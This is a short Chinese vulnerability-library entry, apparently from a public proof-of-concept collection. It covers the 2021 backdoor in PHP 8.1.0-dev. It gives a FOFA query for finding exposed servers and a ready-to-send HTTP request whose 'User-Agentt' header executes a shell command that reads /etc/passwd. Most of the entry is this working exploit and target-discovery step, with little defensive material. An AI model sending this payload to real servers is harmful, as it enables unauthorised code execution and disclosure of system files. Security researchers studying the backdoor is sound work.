---
fofa: "PHP/8.1.0-dev"
source: "wy876 漏洞文库"
---

# PHP-8.1.0-dev zerodium后门命令执行漏洞

# 一、漏洞简介
PHP 8.1.0-dev 版本在2021年3月28日被植入后门，但是后门很快被发现并清除。当服务器存在该后门时，攻击者可以通过发送`User-Agentt`头来执行任意代码。

# 二、影响版本
+ PHP/8.1.0-dev

# 三、资产测绘
+ fofa`"PHP/8.1.0-dev"`
+ 特征


# 四、漏洞复现
```plain
GET / HTTP/1.1
Host: xx.xx.xx.xx
User-Agentt: zerodiumsystem("cat /etc/passwd");
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/wr81rdntsr6nz25n>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
